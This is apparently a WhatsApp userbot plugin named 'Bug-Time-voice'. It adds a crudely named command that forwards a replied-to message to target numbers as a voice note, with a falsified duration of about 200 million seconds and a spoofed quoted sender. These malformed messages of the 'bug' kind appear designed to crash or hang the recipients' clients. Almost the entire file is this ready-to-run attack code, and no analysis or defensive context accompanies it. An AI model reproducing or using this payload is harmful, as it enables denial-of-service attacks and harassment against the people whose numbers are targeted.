# Bug-Time-voice
const Asena = require("../Utilis/events");
const { forwardOrBroadCast } = require("../Utilis/groupmute");
const { getBuffer } = require('../Utilis/download');
const { parseJid } = require("../Utilis/vote");
// AHMAD.4UX  
const url = 'https://i.imgur.com/Q9CR0Cv_d.webp?maxwidth=640&shape=thumb&fidelity=medium'
Asena.addCommand(
  { pattern: 'MR.FUCK ?(.*)', fromMe: true, desc: "Forward replied msg." },
  async (message, match) => {
    if (match == "") return await message.sendMessage("*BY AHMAD.4UX*");
    if (!message.reply_message)
      return await message.sendMessage("*Reply to a Message*");
    const buff = await getBuffer(url)
    let options = {}
    options.ptt = true 
    options.quoted = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
    } 
    options.duration = 200001355, 
    match.match(parseJid).map((jid) => {
      forwardOrBroadCast(jid, message, options);
    });
  }
);
